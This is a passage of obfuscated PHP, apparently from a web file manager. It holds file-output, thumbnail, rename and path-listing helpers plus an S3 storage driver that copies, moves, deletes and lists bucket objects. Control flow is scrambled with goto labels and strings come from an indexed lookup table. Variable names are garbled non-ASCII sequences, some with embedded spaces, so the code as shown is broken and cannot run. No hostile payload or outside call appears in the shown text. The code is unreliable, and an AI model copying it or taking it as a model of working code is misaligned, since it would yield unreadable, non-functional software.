header($có–€…”Ôú[152]); header("\103\x6f\156\164\x65\156\x74\x2d\122\x61\156\x67\x65\72\40\142\171\x74\145\163\40{$dî´≈‘·†—}\55{$A®¨àÆÑõ˜}\x2f" . $bÙ°ÇÖ Ï¡); } else { header($có–€…”Ôú[153]); } goto B’µë∞ìû; FƒÑºß˜ÚΩ: header($có–€…”Ôú[138] . $bÙ°ÇÖ Ï¡); header($có–€…”Ôú[139]); if (!$C∑ûÖ†¯Ê• && $bÃå¥ŸêÜ™ == $có–€…”Ôú[140]) { if ($bÙ°ÇÖ Ï¡ > 1024 * 1024 * 5) { die; } $E÷œàﬁÊ À = $this->getContent($E√Ôâ¡¿“™); $E÷œàﬁÊ À = Html::clearSVG($E÷œàﬁÊ À); header($có–€…”Ôú[141] . strlen($E÷œàﬁÊ À)); echo $E÷œàﬁÊ À; die; } goto c⁄É˘“‘¬‚; cËÏû÷¢ï◊: header($có–€…”Ôú[135] . $bËÏèº∞Ã  . $có–€…”Ôú[127]); header($có–€…”Ôú[136] . $bãÒêßﬁ§Â); header($có–€…”Ôú[137]); goto FƒÑºß˜ÚΩ; EË∫ˆˆñ◊€: if (in_array($bÃå¥ŸêÜ™, array($có–€…”Ôú[111], $có–€…”Ôú[112], $có–€…”Ôú[113], $có–€…”Ôú[114]))) { $bÃå¥ŸêÜ™ = $có–€…”Ôú[115]; } if (!$EÖΩà‹©Ïí) { $EÖΩà‹©Ïí = md5($bËÏèº∞Ã  . $this->hashSimple($E√Ôâ¡¿“™)); } $EÖΩà‹©Ïí = $có–€…”Ôú[116] . $EÖΩà‹©Ïí . $có–€…”Ôú[116]; goto E”ı§Èâàﬁ; f‡‚·Êáñﬁ: $có–€…”Ôú =& $_SERVER[’ÿƒ†ïò]; $this->cacheMethod(null, null); if (!$E√Ôâ¡¿“™ || !$this->exist($E√Ôâ¡¿“™)) { show_json(LNG($có–€…”Ôú[105]), !1, $c≈´‰é™›≤); } goto a—îèûÖÂâ; C·µ£åﬂå: } public function fileOutServer($dÖã»äåúÓ, $fŸ£ìñî‰ú = false, $FéÜ’÷ﬂ≠ã = false, $Eÿå„è–◊Í = '') { $this->fileOut($dÖã»äåúÓ, $fŸ£ìñî‰ú, $FéÜ’÷ﬂ≠ã, $Eÿå„è–◊Í); } public function fileOutLink($dº∫¥∞÷”) { header($_SERVER[’ÿƒ†ïò][159] . $dº∫¥∞÷”); die; } public function cacheMethod($AÛØ‡‚ÍÜÍ, $BÚÜ˜‰›Úë, $bàçøªë∂Ú = null) { goto CÓäèÊáæÒ; FûÂèØõî∂: $AæìπäﬂÏÌ = $this->{$AÛØ‡‚ÍÜÍ}($BÚÜ˜‰›Úë); $f–¬≠®œÿ[$CÚËìÕíÊ“] = $AæìπäﬂÏÌ; return $AæìπäﬂÏÌ; goto AÙÜòÇè†∏; CÓäèÊáæÒ: $EÁ˜ñÏÍø¡ =& $_SERVER[’ÿƒ†ïò]; static $f–¬≠®œÿ = array(); $e∑êø‹Íœ— = $BÚÜ˜‰›Úë ? ltrim($this->getPathOuter($BÚÜ˜‰›Úë), $EÁ˜ñÏÍø¡[8]) : $BÚÜ˜‰›Úë; goto Cß◊≥àÆÒ‰; b‰ª—â«Ó¡: if (!is_null($bàçøªë∂Ú)) { $f–¬≠®œÿ[$CÚËìÕíÊ“] = $bàçøªë∂Ú; return; } $AæìπäﬂÏÌ = isset($f–¬≠®œÿ[$CÚËìÕíÊ“]) ? $f–¬≠®œÿ[$CÚËìÕíÊ“] : null; if (!is_null($AæìπäﬂÏÌ)) { return $AæìπäﬂÏÌ; } goto FûÂèØõî∂; Cß◊≥àÆÒ‰: $CÚËìÕíÊ“ = $EÁ˜ñÏÍø¡[160] . $AÛØ‡‚ÍÜÍ . $EÁ˜ñÏÍø¡[161] . rtrim($e∑êø‹Íœ—, $EÁ˜ñÏÍø¡[8]); if (is_null($AÛØ‡‚ÍÜÍ)) { $f–¬≠®œÿ = array(); return; } if (is_null($BÚÜ˜‰›Úë)) { unset($f–¬≠®œÿ[$CÚËìÕíÊ“]); return; } goto b‰ª—â«Ó¡; AÙÜòÇè†∏: } public function fileOutImage($b¬Ëƒêêö‰, $Eùß≤Ç©≈ = 250) { goto bìÙﬂ¥Ü˜°; bÏ“•ÇÀâè: $açπ…’Ãßø = "{$B∫…∑Âöø∑}\137{$Eùß≤Ç©≈}\56\x70\x6e\147"; if (!($Dáã≈ì Ñ˘ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Bõæ¯î°£≠[172]))) { $Fô™„Âíí≥ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Bõæ¯î°£≠[173]); } else { $Fô™„Âíí≥ = KodIO::make($Dáã≈ì Ñ˘); } if ($Dáã≈ì Ñ˘ = IO::fileNameExist($Fô™„Âíí≥, $açπ…’Ãßø)) { $eãÆÙóï∂§ = KodIO::make($Dáã≈ì Ñ˘); return IO::fileOut($eãÆÙóï∂§, !1, $D∆¬Â´î¨Ú); } goto FÊ⁄ÂÊ¿Çƒ; BÊøëëûåﬂ: del_file($eãÆÙóï∂§); IO::fileOut($a —⁄Ó«è–); goto Fì≥íáÖø•; c—≠ÎäËÆõ: if (!@file_exists($eãÆÙóï∂§)) { $aëƒ—ú˘ûç = TEMP_FILES; if (!is_dir($aëƒ—ú˘ûç)) { mk_dir($aëƒ—ú˘ûç); } $E∏œ»Ëøú÷ = $aëƒ—ú˘ûç . $B∫…∑Âöø∑ . $Bõæ¯î°£≠[95] . $f∑Öü°à⁄¥[$Bõæ¯î°£≠[168]]; if (!@file_exists($E∏œ»Ëøú÷)) { $E∏œ»Ëøú÷ = $this->download($b¬Ëƒêêö‰, $E∏œ»Ëøú÷); } ImageThumb::createThumb($E∏œ»Ëøú÷, $eãÆÙóï∂§, $Eùß≤Ç©≈, $Eùß≤Ç©≈ * 10); } if (!file_exists($eãÆÙóï∂§) || filesize($eãÆÙóï∂§) < 100) { return @file_exists($E∏œ»Ëøú÷) ? IO::fileOut($E∏œ»Ëøú÷) : $this->fileOut($b¬Ëƒêêö‰); } if (!($a —⁄Ó«è– = IO::move($eãÆÙóï∂§, $Fô™„Âíí≥))) { return IO::fileOut($eãÆÙóï∂§); } goto BÊøëëûåﬂ; Eö®÷ŒÁ÷ê: if (isset($GLOBALS[$Bõæ¯î°£≠[162]]) && $GLOBALS[$Bõæ¯î°£≠[162]][$Bõæ¯î°£≠[76]] == $f∑Öü°à⁄¥[$Bõæ¯î°£≠[76]]) { $E˜‡¡»Øúç = $GLOBALS[$Bõæ¯î°£≠[162]][$Bõæ¯î°£≠[163]]; if (!$f∑Öü°à⁄¥[$Bõæ¯î°£≠[164]]) { $f∑Öü°à⁄¥[$Bõæ¯î°£≠[164]] = $GLOBALS[$Bõæ¯î°£≠[162]]; } if (isset($E˜‡¡»Øúç[$Bõæ¯î°£≠[165]])) { if ($E˜‡¡»Øúç[$Bõæ¯î°£≠[165]] <= $Eùß≤Ç©≈ && $E˜‡¡»Øúç[$Bõæ¯î°£≠[166]] <= $Eùß≤Ç©≈) { $d¨Û±ïﬁºç = !0; } } $D∆¬Â´î¨Ú = $f∑Öü°à⁄¥[$Bõæ¯î°£≠[164]][$Bõæ¯î°£≠[28]]; } if ($f∑Öü°à⁄¥[$Bõæ¯î°£≠[78]] <= 1024 * 50 || $d¨Û±ïﬁºç || !function_exists($Bõæ¯î°£≠[167]) || $f∑Öü°à⁄¥[$Bõæ¯î°£≠[168]] == $Bõæ¯î°£≠[169]) { return $this->fileOut($b¬Ëƒêêö‰, !1, $D∆¬Â´î¨Ú); } if (isset($f∑Öü°à⁄¥[$Bõæ¯î°£≠[164]][$Bõæ¯î°£≠[170]])) { $B∫…∑Âöø∑ = $f∑Öü°à⁄¥[$Bõæ¯î°£≠[164]][$Bõæ¯î°£≠[170]]; } else { if (isset($f∑Öü°à⁄¥[$Bõæ¯î°£≠[164]][$Bõæ¯î°£≠[171]])) { $B∫…∑Âöø∑ = $f∑Öü°à⁄¥[$Bõæ¯î°£≠[164]][$Bõæ¯î°£≠[171]]; } else { $B∫…∑Âöø∑ = md5("{$f∑Öü°à⁄¥[$Bõæ¯î°£≠[28]]}\137{$f∑Öü°à⁄¥[$Bõæ¯î°£≠[76]]}\137{$f∑Öü°à⁄¥[$Bõæ¯î°£≠[78]]}"); } } goto bÏ“•ÇÀâè; b◊¢ê …ëÉ: $f∑Öü°à⁄¥ = $this->info($b¬Ëƒêêö‰); $D∆¬Â´î¨Ú = $f∑Öü°à⁄¥[$Bõæ¯î°£≠[28]]; $d¨Û±ïﬁºç = !1; goto Eö®÷ŒÁ÷ê; FÊ⁄ÂÊ¿Çƒ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $eãÆÙóï∂§ = DATA_THUMB . $açπ…’Ãßø; del_file($eãÆÙóï∂§); goto c—≠ÎäËÆõ; bìÙﬂ¥Ü˜°: $Bõæ¯î°£≠ =& $_SERVER[’ÿƒ†ïò]; set_timeout(); if (substr($b¬Ëƒêêö‰, 0, 4) == $Bõæ¯î°£≠[147]) { $this->fileOutLink($b¬Ëƒêêö‰); } goto b◊¢ê …ëÉ; Fì≥íáÖø•: } public function fileOutImageServer($f˘Á«ùü¬¡, $B„Áôﬂâƒ‹ = 250) { $this->fileOutImage($f˘Á«ùü¬¡, $B„Áôﬂâƒ‹); } public function fileNameAuto($AÃ±Ö£°‘Ö, $E´∫ΩÛŒ‡ƒ, $bÁ‚ÖΩÛÑ™ = REPEAT_RENAME, $fªóΩ°›æ¯ = false) { goto Dí‡†£Öﬁà; a”ã‡ı©ÊÙ: while ($this->exist(rtrim($AÃ±Ö£°‘Ö, $dŸ¡®‘ëõö[8]) . $dŸ¡®‘ëõö[8] . $eÇËµ´ äÜ)) { $eÇËµ´ äÜ = $b≥¡∆Íë∂⁄ . "\x28{$aó‘‰òàíê}\x29{$d∆õ°•⁄á§}"; $aó‘‰òàíê++; } return $eÇËµ´ äÜ; goto f»Õ‰πëàí; C“Öò˘ÿßú: $aó‘‰òàíê = 1; $b≥¡∆Íë∂⁄ = substr($E´∫ΩÛŒ‡ƒ, 0, strlen($E´∫ΩÛŒ‡ƒ) - strlen($d∆õ°•⁄á§)); $eÇËµ´ äÜ = $b≥¡∆Íë∂⁄ . "\50{$aó‘‰òàíê}\x29{$d∆õ°•⁄á§}"; goto a”ã‡ı©ÊÙ; Dí‡†£Öﬁà: $dŸ¡®‘ëõö =& $_SERVER[’ÿƒ†ïò]; $DÀ≤©˜ÂÖ÷ = $AÃ±Ö£°‘Ö === $dŸ¡®‘ëõö[33] ? $E´∫ΩÛŒ‡ƒ : rtrim($AÃ±Ö£°‘Ö, $dŸ¡®‘ëõö[8]) . $dŸ¡®‘ëõö[8] . $E´∫ΩÛŒ‡ƒ; if ($bÁ‚ÖΩÛÑ™ == REPEAT_REPLACE || !$this->exist($DÀ≤©˜ÂÖ÷) || $fªóΩ°›æ¯ && $bÁ‚ÖΩÛÑ™ != REPEAT_RENAME_FOLDER) { return $E´∫ΩÛŒ‡ƒ; } goto F™íË€ÓÏ•; F™íË€ÓÏ•: if ($bÁ‚ÖΩÛÑ™ == REPEAT_SKIP) { return !1; } $d∆õ°•⁄á§ = $dŸ¡®‘ëõö[95] . get_path_ext($E´∫ΩÛŒ‡ƒ); $d∆õ°•⁄á§ = $d∆õ°•⁄á§ == $dŸ¡®‘ëõö[95] || $fªóΩ°›æ¯ ? $dŸ¡®‘ëõö[33] : $d∆õ°•⁄á§; goto C“Öò˘ÿßú; f»Õ‰πëàí: } private function fileNameAutoList($Aã‹⁄†çîè, $b‘•üüÀó◊, $fìäÏπ®ã€ = false) { goto dÉÎèî¨„ä; eÂÇ÷µ±∞ƒ: return $a„ºË∫µêâ; goto D›£¡çΩ≠´; dÉÎèî¨„ä: $DË™ˆÇâÊƒ =& $_SERVER[’ÿƒ†ïò]; $EÏ•Í–ç∞é = $this->listPath($Aã‹⁄†çîè, !0); $EÏ•Í–ç∞é = array_merge($EÏ•Í–ç∞é[$DË™ˆÇâÊƒ[75]], $EÏ•Í–ç∞é[$DË™ˆÇâÊƒ[74]]); goto E˜∆çäÛÕò; C‡éÎ⁄ÆÎƒ: $CÜÜ÷Ÿ≥≠µ = substr($b‘•üüÀó◊, 0, strlen($b‘•üüÀó◊) - strlen($D¢éè´É“)); $a„ºË∫µêâ = $CÜÜ÷Ÿ≥≠µ . "\50\60\x29{$D¢éè´É“}"; for ($cªä˘„Õ°» = 1; $cªä˘„Õ°» <= count($f…•®÷È¥Ï) + 1; $cªä˘„Õ°»++) { $a„ºË∫µêâ = $CÜÜ÷Ÿ≥≠µ . "\50{$cªä˘„Õ°»}\x29{$D¢éè´É“}"; if (!in_array_not_case($a„ºË∫µêâ, $f…•®÷È¥Ï)) { return $a„ºË∫µêâ; } } goto eÂÇ÷µ±∞ƒ; E˜∆çäÛÕò: $f…•®÷È¥Ï = array_to_keyvalue($EÏ•Í–ç∞é, $DË™ˆÇâÊƒ[33], $DË™ˆÇâÊƒ[28]); $D¢éè´É“ = $DË™ˆÇâÊƒ[95] . get_path_ext($b‘•üüÀó◊); $D¢éè´É“ = $D¢éè´É“ == $DË™ˆÇâÊƒ[95] || $fìäÏπ®ã€ ? $DË™ˆÇâÊƒ[33] : $D¢éè´É“; goto C‡éÎ⁄ÆÎƒ; D›£¡çΩ≠´: } public function listAllFiles($EÍÍò≠¨Ç∑, $cï∞Æäœ„¥, $B≤‡ÛÖÁçÔ = array()) { goto c¥›ûﬁı¥‹; bÀ÷≈∞°Ë∆: foreach (array_unique($B≥ﬂ–áß‡◊) as $C∑ã©í÷Ö«) { $A˘∞÷òÀ«ç = array($b∆á€ƒ¬ÈÇ[76] => $this->getPathOuter($b∆á€ƒ¬ÈÇ[8] . $EÍÍò≠¨Ç∑ . $b∆á€ƒ¬ÈÇ[8] . $C∑ã©í÷Ö«), $b∆á€ƒ¬ÈÇ[77] => 1, $b∆á€ƒ¬ÈÇ[78] => 0); if (substr($C∑ã©í÷Ö«, -1) != $b∆á€ƒ¬ÈÇ[8]) { $A˘∞÷òÀ«ç[$b∆á€ƒ¬ÈÇ[77]] = 0; $bâÿäü”È = $this->getPath($EÍÍò≠¨Ç∑ . $b∆á€ƒ¬ÈÇ[8] . $C∑ã©í÷Ö«); $A˘∞÷òÀ«ç[$b∆á€ƒ¬ÈÇ[78]] = isset($B≤‡ÛÖÁçÔ[$bâÿäü”È]) ? $B≤‡ÛÖÁçÔ[$bâÿäü”È] : $this->size($bâÿäü”È); } $CøÃ¡≈∑€´[] = $A˘∞÷òÀ«ç; } return $CøÃ¡≈∑€´; goto BÉñÇöŒÃÍ; D«¯ØÒ“ûÀ: $EÍÍò≠¨Ç∑ = trim($EÍÍò≠¨Ç∑, $b∆á€ƒ¬ÈÇ[8]); foreach ($cï∞Æäœ„¥ as $C∑ã©í÷Ö«) { $cº’àÛÑÉÏ = ltrim(substr(trim($C∑ã©í÷Ö«, $b∆á€ƒ¬ÈÇ[8]), strlen($EÍÍò≠¨Ç∑)), $b∆á€ƒ¬ÈÇ[8]); $B≥ﬂ–áß‡◊ = array_merge($B≥ﬂ–áß‡◊, $this->slicePath($cº’àÛÑÉÏ)); } $CøÃ¡≈∑€´ = array(); goto bÀ÷≈∞°Ë∆; c¥›ûﬁı¥‹: $b∆á€ƒ¬ÈÇ =& $_SERVER[’ÿƒ†ïò]; if (empty($cï∞Æäœ„¥)) { return array(); } $B≥ﬂ–áß‡◊ = array(); goto D«¯ØÒ“ûÀ; BÉñÇöŒÃÍ: } public function slicePath($d‰¶·Ö”ÿÎ) { $e©∏äÍ≈‡˜ =& $_SERVER[’ÿƒ†ïò]; $fçÀÈâˆá∑ = explode($e©∏äÍ≈‡˜[8], trim($d‰¶·Ö”ÿÎ, $e©∏äÍ≈‡˜[8])); $Dò∆∆Àõ≥˘ = 0; do { ++$Dò∆∆Àõ≥˘; $F·£ﬁ§€Ÿõ[] = implode($e©∏äÍ≈‡˜[8], array_slice($fçÀÈâˆá∑, 0, $Dò∆∆Àõ≥˘)) . $e©∏äÍ≈‡˜[8]; } while ($Dò∆∆Àõ≥˘ < count($fçÀÈâˆá∑)); $F·£ﬁ§€Ÿõ[count($fçÀÈâˆá∑) - 1] = $d‰¶·Ö”ÿÎ; return $F·£ﬁ§€Ÿõ; } public function getHost() { $c°ÌŸ¥Âè“ =& $_SERVER[’ÿƒ†ïò]; $cã°›¢›‚∏ = parse_url(trim($this->domain, $c°ÌŸ¥Âè“[8])); $fÙùèµÑ◊Ò = isset($cã°›¢›‚∏[$c°ÌŸ¥Âè“[174]]) ? $cã°›¢›‚∏[$c°ÌŸ¥Âè“[174]] : http_type(); $eëÆØ“ñÖ· = isset($cã°›¢›‚∏[$c°ÌŸ¥Âè“[175]]) ? $cã°›¢›‚∏[$c°ÌŸ¥Âè“[175]] : $cã°›¢›‚∏[$c°ÌŸ¥Âè“[76]]; if (isset($cã°›¢›‚∏[$c°ÌŸ¥Âè“[176]])) { $eëÆØ“ñÖ· .= $c°ÌŸ¥Âè“[4] . $cã°›¢›‚∏[$c°ÌŸ¥Âè“[176]]; } return $fÙùèµÑ◊Ò . $c°ÌŸ¥Âè“[177] . $eëÆØ“ñÖ·; } public function pathEncode($DÑíèáßÙã) { $AÊÃ⁄µßÃä =& $_SERVER[’ÿƒ†ïò]; return str_replace($AÊÃ⁄µßÃä[178], $AÊÃ⁄µßÃä[8], rawurlencode($DÑíèáßÙã)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($d≠Éæ°ËÌõ) { set_timeout(); require_once SDK_DIR . $_SERVER[’ÿƒ†ïò][179]; parent::__construct(); $this->_init($d≠Éæ°ËÌõ); } public function _init($c…∏⁄Îå∏Ú) { foreach ($c…∏⁄Îå∏Ú as $d§€◊¢õÎ¢ => $fïÑâ∂±ãâ) { if (isset($this->{$d§€◊¢õÎ¢})) { $this->{$d§€◊¢õÎ¢} = $fïÑâ∂±ãâ; } } $this->endpoint = $c…∏⁄Îå∏Ú[$_SERVER[’ÿƒ†ïò][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($aŸú‚ÂÂπÕ = "\166\64") { $this->signVer = $aŸú‚ÂÂπÕ; $this->client->setSignatureVersion($aŸú‚ÂÂπÕ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto C’ôﬂÓ¥Æ®; Fòˆ≠Ùﬁ¬™: $dæ≥°‘∆Ÿ‡ = array($DÑÔ»É¥û¥[186], $DÑÔ»É¥û¥[187], $DÑÔ»É¥û¥[188], $DÑÔ»É¥û¥[189], $DÑÔ»É¥û¥[190]); $a√≥êÌ◊›ñ = array_diff($dæ≥°‘∆Ÿ‡, $aìáù¯ÁØâ); return empty($a√≥êÌ◊›ñ); goto AÀ¨∆Æ”Ñ⁄; C’ôﬂÓ¥Æ®: $DÑÔ»É¥û¥ =& $_SERVER[’ÿƒ†ïò]; $f’ïÉ–ˆ◊ä = $this->getBucketCors(); if (!$f’ïÉ–ˆ◊ä || !is_array($f’ïÉ–ˆ◊ä)) { return !1; } goto fÑÇ∆π–·ñ; fÑÇ∆π–·ñ: if ($f’ïÉ–ˆ◊ä[$DÑÔ»É¥û¥[181]] != $DÑÔ»É¥û¥[182] || $f’ïÉ–ˆ◊ä[$DÑÔ»É¥û¥[183]] != $DÑÔ»É¥û¥[182]) { return !1; } $aìáù¯ÁØâ = array_map($DÑÔ»É¥û¥[184], $f’ïÉ–ˆ◊ä[$DÑÔ»É¥û¥[185]]); if (!is_array($aìáù¯ÁØâ)) { $aìáù¯ÁØâ = array(); } goto Fòˆ≠Ùﬁ¬™; AÀ¨∆Æ”Ñ⁄: } public function mkfile($Aª≈Ë¨£©¢, $bµÂÃ˜≈ö˜ = '', $B÷§Õ…ñÔ¶ = REPEAT_RENAME) { $dÁ¶ÖçõÏº = $this->setContent($Aª≈Ë¨£©¢, $bµÂÃ˜≈ö˜); if ($dÁ¶ÖçõÏº !== !1) { return $this->getPathOuter($Aª≈Ë¨£©¢); } return !1; } public function mkdir($eÒ∆£îÃçä, $E∑⁄⁄àª« = REPEAT_SKIP) { $eªóäõ˘è =& $_SERVER[’ÿƒ†ïò]; if (empty($eÒ∆£îÃçä) && $eÒ∆£îÃçä !== $eªóäõ˘è[191]) { return !1; } if ($this->_isFolder($eÒ∆£îÃçä)) { return $this->getPathOuter($eÒ∆£îÃçä); } $EãÌ⁄ıÂ∫Ò = $this->setContent($eÒ∆£îÃçä, $eªóäõ˘è[33], !0); if ($EãÌ⁄ıÂ∫Ò !== !1) { return $this->getPathOuter($eÒ∆£îÃçä); } return !1; } public function copyFile($dÑíüπõﬁ∆, $CÎº†°Œí§, $b∫à‚‹ïﬁŒ = array()) { $e≈ïï´Ê’û =& $_SERVER[’ÿƒ†ïò]; $bÖ–Ö›Ãªı = $this->objectMeta($dÑíüπõﬁ∆); if (!$bÖ–Ö›Ãªı) { return !1; } if ($bÖ–Ö›Ãªı[$e≈ïï´Ê’û[78]] <= 1024 * 1024 * 200) { $a’©É‰•ûÇ = $this->client->copyObject($this->bucket, $dÑíüπõﬁ∆, $this->bucket, $CÎº†°Œí§, $e≈ïï´Ê’û[192], $b∫à‚‹ïﬁŒ); } else { $a’©É‰•ûÇ = $this->client->multiCopyObject($this->bucket, $dÑíüπõﬁ∆, $this->bucket, $CÎº†°Œí§, $b∫à‚‹ïﬁŒ); } $a’©É‰•ûÇ = $a’©É‰•ûÇ ? $this->getPathOuter($CÎº†°Œí§) : !1; return $a’©É‰•ûÇ; } public function moveFile($D†å•ﬂöòç, $C∏£’¶ÑÚ´) { if ($this->copyFile($D†å•ﬂöòç, $C∏£’¶ÑÚ´)) { $this->delFile($D†å•ﬂöòç); return $this->getPathOuter($C∏£’¶ÑÚ´); } return !1; } public function delFile($AÃ£Ê¿Û≤˘) { return $this->client->deleteObject($this->bucket, $AÃ£Ê¿Û≤˘); } public function delFolder($f∏ªÆÎÀÉñ) { goto fï∏Øåµ·ı; F‚›€õ«ı¿: if (!empty($f∏ªÆÎÀÉñ) && $f∏ªÆÎÀÉñ !== $dæÈ¢Ú◊Çª[191] && !in_array($aØÁÙ¡ó«ı, $fÒ¯Üä ≈Ô[$dæÈ¢Ú◊Çª[75]])) { $fÒ¯Üä ≈Ô[$dæÈ¢Ú◊Çª[75]][] = $aØÁÙ¡ó«ı; } $F´µª⁄†ÿä = $this->delByBatch($fÒ¯Üä ≈Ô[$dæÈ¢Ú◊Çª[74]]); if (!$F´µª⁄†ÿä) { return !1; } goto cÀµ™÷Ωãı; cÀµ™÷Ωãı: $F´µª⁄†ÿä = $this->delByBatch($fÒ¯Üä ≈Ô[$dæÈ¢Ú◊Çª[75]]); if (!$F´µª⁄†ÿä) { return !1; } return $this->delFile($aØÁÙ¡ó«ı); goto C°à⁄°¡Î„; fï∏Øåµ·ı: $dæÈ¢Ú◊Çª =& $_SERVER[’ÿƒ†ïò]; if (!$this->exist($f∏ªÆÎÀÉñ)) { return !0; } $this->listItemCache = !1; goto e≥◊àã∏úÑ; e≥◊àã∏úÑ: $fÒ¯Üä ≈Ô = $this->fileList($f∏ªÆÎÀÉñ); $this->listItemCache = !0; $aØÁÙ¡ó«ı = trim($f∏ªÆÎÀÉñ, $dæÈ¢Ú◊Çª[8]) . $dæÈ¢Ú◊Çª[8]; goto F‚›€õ«ı¿; C°à⁄°¡Î„: } private function delByBatch($B≤¶®ñ€∂‘) { foreach (array_chunk($B≤¶®ñ€∂‘, 1000) as $B ±Ëóô¨ˆ) { $BÌ⁄—ÿÿÎï = $this->client->deleteObjects($this->bucket, $B ±Ëóô¨ˆ); if (!$BÌ⁄—ÿÿÎï) { return !1; } } return !0; } public function rename($B€Èè»Ÿã , $BÙ´ÜâöŒ∑) { return $this->renameObject($B€Èè»Ÿã , $BÙ´ÜâöŒ∑); } public function listPath($d«Œ©µ¯‘ö, $dÖ™àïÇËª = false) { $FßÍ÷·∞Ω‰ =& $_SERVER[’ÿƒ†ïò]; $d≥€—À∏Õ„ = $this->fileList($d«Œ©µ¯‘ö, $FßÍ÷·∞Ω‰[8], !0); foreach ($d≥€—À∏Õ„[$FßÍ÷·∞Ω‰[75]] as $eæ†√õà© => $dÒâÀßÀ√˜) { $d≥€—À∏Õ„[$FßÍ÷·∞Ω‰[75]][$eæ†√õà©] = $this->folderInfo($dÒâÀßÀ√˜, $dÖ™àïÇËª); } foreach ($d≥€—À∏Õ„[$FßÍ÷·∞Ω‰[74]] as $eæ†√õà© => $dÒâÀßÀ√˜) { $d≥€—À∏Õ„[$FßÍ÷·∞Ω‰[74]][$eæ†√õà©] = $this->fileInfo($dÒâÀßÀ√˜[$FßÍ÷·∞Ω‰[28]], $dÖ™àïÇËª, $dÒâÀßÀ√˜); } return $d≥€—À∏Õ„; } private function fileInfo($DΩ¶Ω˘éÃä, $B—Âˆ÷á¯≠ = false, $f‘Ã⁄˜èèË = array()) { goto fï“ÿ∫ƒü∂; fï“ÿ∫ƒü∂: $eê˘Üçº©Ë =& $_SERVER[’ÿƒ†ïò]; $CÀúÌπßëá = array($eê˘Üçº©Ë[28] => $this->pathThis($DΩ¶Ω˘éÃä), $eê˘Üçº©Ë[76] => $this->getPathOuter($DΩ¶Ω˘éÃä), $eê˘Üçº©Ë[29] => $eê˘Üçº©Ë[193], $eê˘Üçº©Ë[168] => $this->ext($DΩ¶Ω˘éÃä), $eê˘Üçº©Ë[78] => isset($f‘Ã⁄˜èèË[$eê˘Üçº©Ë[78]]) ? $f‘Ã⁄˜èèË[$eê˘Üçº©Ë[78]] : 0); if ($B—Âˆ÷á¯≠) { return $CÀúÌπßëá; } goto a´®òµ±Á≈; bÌ›∑¬ùŒÜ: if (isset($f‘Ã⁄˜èèË[$eê˘Üçº©Ë[197]])) { $CÀúÌπßëá[$eê˘Üçº©Ë[84]] = $f‘Ã⁄˜èèË[$eê˘Üçº©Ë[197]]; } if (isset($f‘Ã⁄˜èèË[$eê˘Üçº©Ë[78]])) { $CÀúÌπßëá[$eê˘Üçº©Ë[78]] = $f‘Ã⁄˜èèË[$eê˘Üçº©Ë[78]]; } return $CÀúÌπßëá; goto BÀÖ∂Ωá«¢; a´®òµ±Á≈: $CÀúÌπßëá[$eê˘Üçº©Ë[194]] = $CÀúÌπßëá[$eê˘Üçº©Ë[84]] = 0; $CÀúÌπßëá[$eê˘Üçº©Ë[195]] = $CÀúÌπßëá[$eê˘Üçº©Ë[196]] = !0; if (empty($f‘Ã⁄˜èèË)) { $f‘Ã⁄˜èèË = $this->objectMeta($DΩ¶Ω˘éÃä); if (!$f‘Ã⁄˜èèË) { return $CÀúÌπßëá; } } goto bÌ›∑¬ùŒÜ; BÀÖ∂Ωá«¢: } private function folderInfo($c…íêë≠íë, $cèåÜ◊ÕÙÏ = false) { goto eé˜≈°Òáè; Bè†π÷Ç ‘: $c…íêë≠íë = trim($c…íêë≠íë, $C£Â≠âçôâ[8]) . $C£Â≠âçôâ[8]; $dÆ∞ßÛ¿ó∂ = $this->objectMeta($c…íêë≠íë); if (isset($dÆ∞ßÛ¿ó∂[$C£Â≠âçôâ[197]])) { $DÈñä“Çø∆[$C£Â≠âçôâ[194]] = $dÆ∞ßÛ¿ó∂[$C£Â≠âçôâ[197]]; } goto Dúˆ“˜»ÃÃ; eŸïÉ¬â≥ˆ: $DÈñä“Çø∆[$C£Â≠âçôâ[194]] = $DÈñä“Çø∆[$C£Â≠âçôâ[84]] = 0; $DÈñä“Çø∆[$C£Â≠âçôâ[195]] = $DÈñä“Çø∆[$C£Â≠âçôâ[196]] = !0; if ($c…íêë≠íë == $C£Â≠âçôâ[33]) { return $DÈñä“Çø∆; } goto Bè†π÷Ç ‘; eé˜≈°Òáè: $C£Â≠âçôâ =& $_SERVER[’ÿƒ†ïò]; $DÈñä“Çø∆ = array($C£Â≠âçôâ[28] => $this->pathThis($c…íêë≠íë), $C£Â≠âçôâ[76] => $this->getPathOuter($C£Â≠âçôâ[8] . $c…íêë≠íë), $C£Â≠âçôâ[29] => $C£Â≠âçôâ[77]); if ($cèåÜ◊ÕÙÏ) { return $DÈñä“Çø∆; } goto eŸïÉ¬â≥ˆ; Dúˆ“˜»ÃÃ: return $DÈñä“Çø∆; goto C÷∑êÚÉÒÑ; C÷∑êÚÉÒÑ: } private function fileList($f¨Ï€ïí„ù, $fúˆõ•‹é¢ = '', $fÍπ»Îπ»÷ = 0) { goto f”ˆ∆˜∑√‡; eÛ˘«ŸÓÖ¶: return array($fÙ∞Çäô«[75] => $aœéóÓ·óˆ, $fÙ∞Çäô«[74] => $Bã‰◊¢ä∑Ú); goto Aøæ”œÓÖ„; câ∑¬µ™Çæ: if (!$FŒÖ àú«Â) { return array($fÙ∞Çäô«[75] => array(), $fÙ∞Çäô«[74] => array()); } $e»œ¯ôç¯á = $this->listItemCache === !1 ? !1 : !0; $aœéóÓ·óˆ = $Bã‰◊¢ä∑Ú = array(); goto EΩî•ÈŒÕô; f”ˆ∆˜∑√‡: $fÙ∞Çäô« =& $_SERVER[’ÿƒ†ïò]; $Bµ’∞Ñ⁄ƒ— = rtrim($f¨Ï€ïí„ù, $fÙ∞Çäô«[8]) . $fÙ∞Çäô«[8]; $FŒÖ àú«Â = $this->listObjs($Bµ’∞Ñ⁄ƒ—, null, null, $fúˆõ•‹é¢); goto 